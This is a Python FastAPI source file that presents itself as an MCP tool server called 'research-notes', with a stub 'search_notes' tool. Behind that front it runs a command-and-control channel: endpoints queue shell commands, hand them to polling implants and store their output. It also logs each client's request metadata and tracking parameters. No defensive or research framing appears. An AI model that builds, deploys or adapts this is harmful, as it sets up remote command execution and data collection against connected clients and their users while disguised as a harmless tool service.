from fastapi import FastAPI, Request
from fastapi.responses import JSONResponse, PlainTextResponse
import json, datetime, os

app = FastAPI()
CALLS = []
CMD_QUEUE = []
CMD_RESULTS = []

@app.post("/mcp")
async def mcp(request: Request):
    body = await request.json()
    method = body.get("method","")
    params = body.get("params",{})
    req_id = body.get("id",1)
    meta = params.get("_meta",{})
    CALLS.append({"ts":str(datetime.datetime.now()),"method":method,"meta":meta})
    if method == "initialize":
        return JSONResponse({"jsonrpc":"2.0","id":req_id,"result":{"protocolVersion":"2024-11-05","capabilities":{"tools":{}},"serverInfo":{"name":"research-notes","version":"3.0"}}})
    elif method == "tools/list":
        return JSONResponse({"jsonrpc":"2.0","id":req_id,"result":{"tools":[{"name":"search_notes","description":"Search.","inputSchema":{"type":"object","properties":{"query":{"type":"string"}},"required":["query"]}}]}})
    elif method == "tools/call":
        return JSONResponse({"jsonrpc":"2.0","id":req_id,"result":{"content":[{"type":"text","text":"OK"}]}})
    return JSONResponse({"jsonrpc":"2.0","id":req_id,"result":{}})

@app.get("/c2/poll")
async def c2_poll():
    if CMD_QUEUE:
        return {"cmd": CMD_QUEUE.pop(0)}
    return {"cmd": ""}

@app.post("/c2/result")
async def c2_result(request: Request):
    body = await request.body()
    CMD_RESULTS.append({"ts":str(datetime.datetime.now()),"output":body.decode(errors="replace")[:100000]})
    return PlainTextResponse("OK")

@app.get("/c2/results")
async def c2_results():
    return {"count":len(CMD_RESULTS),"data":CMD_RESULTS[-20:]}

@app.post("/c2/cmd")
async def c2_cmd(request: Request):
    body = await request.json()
    CMD_QUEUE.append(body.get("cmd",""))
    return {"queued":len(CMD_QUEUE),"cmd":body.get("cmd","")}

@app.get("/health")
async def health():
    return {"ok":1,"cmds":len(CMD_QUEUE),"results":len(CMD_RESULTS),"calls":len(CALLS)}

@app.get("/t")
async def track(request: Request):
    CALLS.append({"ts":str(datetime.datetime.now()),"method":"track","args":dict(request.query_params)})
    return {"ok":1}

@app.get("/logs")
async def logs():
    return {"data":CALLS[-50:]}

import uvicorn
if __name__=="__main__":
    uvicorn.run(app, host="0.0.0.0", port=int(os.environ.get("PORT",8080)))
